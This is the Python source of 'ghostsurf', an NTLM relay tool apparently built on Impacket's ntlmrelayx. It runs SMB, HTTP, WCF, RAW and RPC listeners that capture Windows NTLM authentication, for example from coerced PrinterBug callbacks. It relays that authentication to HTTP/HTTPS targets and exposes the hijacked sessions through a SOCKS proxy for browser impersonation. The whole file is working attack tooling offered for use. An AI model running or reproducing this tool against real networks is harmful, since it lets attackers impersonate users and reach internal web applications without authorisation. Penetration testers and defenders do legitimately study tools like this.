#!/usr/bin/env python
# ghostsurf - NTLM Relay Browser Hijacking Tool
#
# Captures NTLM auth from any source (SMB, HTTP, WCF, RAW, RPC)
# Relays to HTTP/HTTPS targets
# SOCKS proxy for browser session impersonation
#
# Based on ntlmrelayx.py from Impacket
# Features kernel-mode auth workaround for IIS/HTTP.sys targets
#

import argparse
import sys
import logging
import signal
import cmd
from urllib.request import ProxyHandler, build_opener, Request
import json
from time import sleep
from threading import Thread

from impacket.examples import logger

# Vendored relay modules with kernel-mode auth support
from lib.relay.utils.config import NTLMRelayxConfig, parse_listening_ports
from lib.relay.servers.socksserver import SOCKS, activeConnections
from lib.relay.clients.httprelayclient import HTTPRelayClient, HTTPSRelayClient

# Capture servers. Each one hands relayed sessions to the SOCKS server through activeConnections.
# The RPC server catches raw DCERPC callbacks (PrinterBug on Windows 11 22H2+ and Server 2025 only
# calls back over RPC) and answers the endpoint mapper lookup on 135.
from impacket.examples.ntlmrelayx.servers import SMBRelayServer, HTTPRelayServer, WCFRelayServer, RAWRelayServer, RPCRelayServer

# Patch relay server modules to use our vendored activeConnections queue
import impacket.examples.ntlmrelayx.servers.smbrelayserver as smb_module
import impacket.examples.ntlmrelayx.servers.httprelayserver as http_module
import impacket.examples.ntlmrelayx.servers.rawrelayserver as raw_module
import impacket.examples.ntlmrelayx.servers.wcfrelayserver as wcf_module
import impacket.examples.ntlmrelayx.servers.rpcrelayserver as rpc_module
smb_module.activeConnections = activeConnections
http_module.activeConnections = activeConnections
raw_module.activeConnections = activeConnections
wcf_module.activeConnections = activeConnections
rpc_module.activeConnections = activeConnections

from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor, TargetsFileWatcher

RELAY_SERVERS = []

BANNER = r"""
  ,--,   .-. .-. .---.    .---.  _______  .---. .-. .-.,---.    ,---.
.' .'    | | | |/ .-. )  ( .-._)|__   __|( .-._)| | | || .-.\   | .-'
|  |  __ | `-' || | |(_)(_) \     )| |  (_) \   | | | || `-'/   | `-.
\  \ ( _)| .-. || | | | _  \ \   (_) |  _  \ \  | | | ||   (    | .-'
 \  `-) )| | |)|\ `-' /( `-'  )    | | ( `-'  ) | `-')|| |\ \   | |
 )\____/ /(  (_) )---'  `----'     `-'  `----'  `---(_)|_| \)\  )\|
(__)    (__)    (_)  NTLM relay browser session hijacking  (__)(__)

"""


class MiniShell(cmd.Cmd):
    def __init__(self, relayConfig, threads, api_address):
        cmd.Cmd.__init__(self)
        self.prompt = 'ghostsurf> '
        self.api_address = api_address
        self.relayConfig = relayConfig
        self.intro = 'Type help for list of commands'
        self.relayThreads = threads
        self.serversRunning = True

    @staticmethod
    def printTable(items, header):
        colLen = []
        for i, col in enumerate(header):
            rowMaxLen = max([len(row[i]) for row in items] or [0])
            colLen.append(max(rowMaxLen, len(col)))
        outputFormat = ' '.join(['{%d:%ds} ' % (num, width) for num, width in enumerate(colLen)])
        print(outputFormat.format(*header))
        print('  '.join(['-' * itemLen for itemLen in colLen]))
        for row in items:
            print(outputFormat.format(*row))

    def emptyline(self):
        pass

    def do_targets(self, line):
        for url in self.relayConfig.target.originalTargets:
            print(url.geturl())

    def do_socks(self, line):
        headers = ["Protocol", "Target", "Username", "AdminStatus", "Port"]
        url = "http://{}/ntlmrelayx/api/v1.0/relays".format(self.api_address)
        try:
            proxy_handler = ProxyHandler({})
            opener = build_opener(proxy_handler)
            response = Request(url)
            r = opener.open(response)
            result = r.read()
            items = json.loads(result)
        except Exception as e:
            logging.error("ERROR: %s" % str(e))
        else:
            if len(items) > 0:
                self.printTable(items, header=headers)
            else:
                logging.info('No Relays Available!')

    def do_exit(self, line):
        print("Shutting down, please wait!")
        return True

    def do_EOF(self, line):
        return self.do_exit(line)


def start_servers(options, threads):
    for server in RELAY_SERVERS:
        c = NTLMRelayxConfig()
        c.setProtocolClients(PROTOCOL_CLIENTS)
        c.setRunSocks(True, socksServer)
        c.setTargets(targetSystem)
        c.setDisableMulti(True)
        c.setEncoding(codec)
        c.setMode(mode)
        c.setIPv6(options.ipv6)
        c.setKernelAuth(options.kernel_auth)
        c.setKeepRelaying(options.keep_relaying)
        c.setSMB2Support(not options.smb1)
        c.setInterfaceIp(options.interface)

        if server is HTTPRelayServer:
            for port in options.http_port:
                c.setListeningPort(port)
                s = server(c)
                s.start()
                threads.add(s)
                sleep(0.1)
            continue
        elif server is SMBRelayServer:
            c.setListeningPort(options.smb_port)
        elif server is WCFRelayServer:
            c.setListeningPort(options.wcf_port)
        elif server is RAWRelayServer:
            c.setListeningPort(options.raw_port)
        elif server is RPCRelayServer:
            c.setListeningPort(options.rpc_port)

        s = server(c)
        s.start()
        threads.add(s)
    return c


if __name__ == '__main__':
    print(BANNER)

    parser = argparse.ArgumentParser(
        add_help=False,
        description="NTLM relay to HTTP/HTTPS with SOCKS proxy for browser session hijacking"
    )
    parser._optionals.title = "Main options"

    # Main arguments
    parser.add_argument("-h", "--help", action="help", help='show this help message and exit')
    parser.add_argument('-s', '--ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-d', '--debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-t', '--target', action='store', metavar='TARGET',
                        help="Target HTTP(S) URL to relay to (e.g. https://target.domain/)")
    parser.add_argument('-f', '--targets-file', action='store', metavar='TARGETSFILE',
                        help='File containing target URLs, one per line')
    parser.add_argument('-w', '--watch', action='store_true',
                        help='Watch target file for changes and update automatically')

    # Interface
    parser.add_argument('-i', '--interface', action='store', metavar='IP',
                        default='', help='IP address of interface to bind servers')

    # Relay servers (incoming auth capture)
    serversoptions = parser.add_argument_group("Relay servers (incoming auth)")
    serversoptions.add_argument('--no-smb-server', action='store_true', help='Disable SMB server')
    serversoptions.add_argument('--no-http-server', action='store_true', help='Disable HTTP server')
    serversoptions.add_argument('--no-wcf-server', action='store_true', help='Disable WCF server')
    serversoptions.add_argument('--no-raw-server', action='store_true', help='Disable RAW server')
    serversoptions.add_argument('--no-rpc-server', action='store_true', help='Disable RPC server')

    # Server ports
    portoptions = parser.add_argument_group("Server ports")
    portoptions.add_argument('--smb-port', type=int, default=445, help='SMB server port (default: 445)')
    portoptions.add_argument('--http-port', default="80",
                             help='HTTP server port(s), comma-separated or range (default: 80)')
    portoptions.add_argument('--wcf-port', type=int, default=9389, help='WCF server port (default: 9389)')
    portoptions.add_argument('--raw-port', type=int, default=6666, help='RAW server port (default: 6666)')
    portoptions.add_argument('--rpc-port', type=int, default=135, help='RPC server port (default: 135)')

    # SOCKS proxy options
    socksoptions = parser.add_argument_group("SOCKS proxy (browser hijacking)")
    socksoptions.add_argument('--socks-address', default='127.0.0.1', help='SOCKS5 bind address (default: 127.0.0.1)')
    socksoptions.add_argument('--socks-port', type=int, default=1080, help='SOCKS5 port (default: 1080)')
    socksoptions.add_argument('--api-port', type=int, default=9090, help='HTTP API port (default: 9090)')

    # HTTP relay options
    relayoptions = parser.add_argument_group("HTTP relay options")
    relayoptions.add_argument('-k', '--kernel-auth', action='store_true',
                              help='Kernel-mode auth workaround for IIS/HTTP.sys (probe paths anonymously first)')
    relayoptions.add_argument('-r', '--keep-relaying', action='store_true',
                              help='Keep relaying to same target after success (reload target list)')
    relayoptions.add_argument('--smb1', action='store_true', help='Use SMB1 only for incoming connections (SMB2 is default)')
    relayoptions.add_argument('-6', '--ipv6', action='store_true', help='Listen on IPv6 and IPv4')

    try:
        options = parser.parse_args()
    except Exception as e:
        logging.error(str(e))
        sys.exit(1)

    # Init logger
    logger.init(options.ts, options.debug)

    # Register protocol clients (only HTTP/HTTPS)
    from impacket.examples.ntlmrelayx.clients import PROTOCOL_CLIENTS

    # Override with vendored HTTP clients
    PROTOCOL_CLIENTS['HTTP'] = HTTPRelayClient
    PROTOCOL_CLIENTS['HTTPS'] = HTTPSRelayClient

    codec = sys.getdefaultencoding()

    # Validate argument combinations
    if options.target and options.targets_file:
        logging.error("Cannot use both -t and -f. Choose one.")
        sys.exit(1)

    if options.watch and not options.targets_file:
        logging.error("-w/--watch requires -f/--targets-file")
        sys.exit(1)

    # Set up target
    if options.target is not None:
        logging.info("Target: %s" % options.target)
        mode = 'RELAY'
        targetSystem = TargetsProcessor(singleTarget=options.target, protocolClients=PROTOCOL_CLIENTS)
    elif options.targets_file is not None:
        logging.info("Targets from file: %s" % options.targets_file)
        targetSystem = TargetsProcessor(targetListFile=options.targets_file, protocolClients=PROTOCOL_CLIENTS)
        mode = 'RELAY'
    else:
        logging.error("No target specified. Use -t or --targets-file")
        sys.exit(1)

    # Set up relay servers
    if not options.no_smb_server:
        RELAY_SERVERS.append(SMBRelayServer)
    if not options.no_http_server:
        RELAY_SERVERS.append(HTTPRelayServer)
        try:
            options.http_port = parse_listening_ports(options.http_port)
        except ValueError:
            logging.error("Invalid HTTP port specification")
            sys.exit(1)
    if not options.no_wcf_server:
        RELAY_SERVERS.append(WCFRelayServer)
    if not options.no_raw_server:
        RELAY_SERVERS.append(RAWRelayServer)
    if not options.no_rpc_server:
        RELAY_SERVERS.append(RPCRelayServer)

    if not RELAY_SERVERS:
        logging.error("All capture servers disabled. Enable at least one.")
        sys.exit(1)

    # Watch targets file if requested
    if options.targets_file and options.watch:
        watchthread = TargetsFileWatcher(targetSystem)
        watchthread.daemon = True
        watchthread.start()

    threads = set()

    # Start SOCKS proxy (always on)
    socksServer = SOCKS(server_address=(options.socks_address, options.socks_port), api_port=options.api_port)
    socksServer.daemon_threads = True
    socks_thread = Thread(target=socksServer.serve_forever)
    socks_thread.daemon = True
    socks_thread.start()
    threads.add(socks_thread)
    logging.info("SOCKS proxy: %s:%d" % (options.socks_address, options.socks_port))

    # Log options status
    if options.kernel_auth:
        logging.info("Kernel-mode auth workaround ENABLED")
    if options.keep_relaying:
        logging.info("Keep-relaying mode ENABLED (will reload targets after success)")

    # Start relay servers
    c = start_servers(options, threads)

    print("")
    logging.info("Servers started, waiting for connections")

    try:
        shell = MiniShell(c, threads, api_address='{}:{}'.format(options.socks_address, options.api_port))

        def handle_sigterm(signum, frame):
            raise KeyboardInterrupt

        signal.signal(signal.SIGTERM, handle_sigterm)
        shell.cmdloop()
    except KeyboardInterrupt:
        pass

    socksServer.shutdown()
    del socksServer

    for s in threads:
        try:
            s.shutdown()
        except Exception:
            pass
        del s

    sys.exit(0)
